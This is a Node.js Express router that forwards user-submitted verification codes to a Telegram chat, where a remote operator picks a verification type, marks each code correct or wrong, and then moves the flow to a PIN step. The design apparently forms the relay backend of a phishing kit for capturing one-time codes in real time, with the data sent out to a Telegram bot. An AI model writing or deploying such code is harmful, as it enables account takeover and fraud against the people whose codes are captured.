const express = require("express");
const router = express.Router();
const axios = require("axios");

// Store verification type and status (in production, use a database)
let selectedVerificationType = null;
let verificationStatus = null;

// Reset verification type
router.post("/reset-verification", (req, res) => {
  selectedVerificationType = null;
  verificationStatus = null;
  res.json({ success: true });
});

// Get current verification type
router.get("/verification-type", (req, res) => {
  res.json({ type: selectedVerificationType });
});

// Get verification status
router.get("/verification-status", (req, res) => {
  res.json({ status: verificationStatus });
});

// Reset verification status
router.post("/reset-status", (req, res) => {
  verificationStatus = null;
  res.sendStatus(200);
});

// Webhook for telegram updates
router.post("/webhook", async (req, res) => {
  try {
    const { callback_query } = req.body;

    if (callback_query) {
      const action = callback_query.data;
      console.log("Received callback action:", action); // Debug log

      if (action.startsWith("type_")) {
        // Handle verification type selection
        const newType = action.replace("type_", "");
        selectedVerificationType = newType;
        console.log(`Setting verification type: ${selectedVerificationType}`);

        try {
          // Acknowledge the callback query
          await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
              callback_query_id: callback_query.id,
              text: `Selected: ${newType} verification`,
            }
          );

          // Update the message to show selection
          await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`,
            {
              chat_id: callback_query.message.chat.id,
              message_id: callback_query.message.message_id,
              text:
                callback_query.message.text +
                `\n\n✅ Selected: ${newType} verification`,
              parse_mode: "HTML",
              reply_markup: JSON.stringify({
                inline_keyboard: [
                  [
                    {
                      text: "✅ Correct Code",
                      callback_data: "verify_correct",
                    },
                    { text: "❌ Wrong Code", callback_data: "verify_wrong" },
                  ],
                ],
              }),
            }
          );
        } catch (error) {
          console.error("Error handling verification type selection:", error);
        }
      } else if (action === "verify_correct") {
        verificationStatus = "pending_pin";
        console.log(`Setting verification status: ${verificationStatus}`);

        try {
          await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
              callback_query_id: callback_query.id,
              text: "Waiting for PIN verification...",
            }
          );
        } catch (error) {
          console.error("Error sending callback response:", error);
        }
      } else if (action === "verify_wrong") {
        verificationStatus = "wrong";
        try {
          await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
              callback_query_id: callback_query.id,
              text: "Code marked as incorrect",
            }
          );
        } catch (error) {
          console.error("Error sending callback response:", error);
        }
      }

      res.status(200).json({
        success: true,
        type: selectedVerificationType,
        status: verificationStatus,
      });
    } else {
      res.status(400).json({ error: "No callback query found" });
    }
  } catch (error) {
    console.error("Webhook error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Add this after the other routes but before module.exports
router.post("/verify-code", async (req, res) => {
  try {
    const { code, verificationType } = req.body;
    verificationStatus = null; // Reset status before new verification

    // Send verification request to telegram
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: `
🔐 <b>Verification Code Check</b>

📝 <b>Type:</b> ${verificationType}
🔑 <b>Code:</b> ${code}

<b>Is this code correct?</b>
        `,
        parse_mode: "HTML",
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: "✅ Correct Code", callback_data: "verify_correct" },
              { text: "❌ Wrong Code", callback_data: "verify_wrong" },
            ],
          ],
        }),
      }
    );

    res.status(200).json({ message: "Verification in progress" });
  } catch (error) {
    console.error("Error sending verification code:", error);
    res.status(500).json({ error: "Failed to process verification" });
  }
});

module.exports = router;
